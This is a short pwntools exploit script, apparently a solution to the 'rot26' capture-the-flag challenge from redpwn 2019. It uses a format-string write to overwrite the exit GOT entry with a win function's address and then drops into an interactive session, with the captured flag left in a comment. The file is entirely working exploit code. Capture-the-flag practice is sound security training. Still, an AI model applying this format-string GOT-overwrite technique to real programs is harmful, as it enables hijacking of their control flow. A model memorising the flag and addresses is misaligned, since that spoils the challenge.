from pwn import * 
from FMT import *

def func(payload):
	p = process("./rot26")
	p.sendline(payload)
	o = p.recvall()
	p.close()
	return o


def exploit():
	fmt = FMT(func, 32)

	exit_got = 0x0804a020
	win = 0x08048737

	payload = fmt.write32(exit_got, win, 'short')
	
	#p = remote("chall.2019.redpwn.net", 4003)
	p = process("./rot26") 

	p.sendline(payload)
	p.interactive()
	p.close()
#flag{w4it_d03s_r0t26_4ctu4lly_ch4ng3_4nyth1ng?}


exploit()

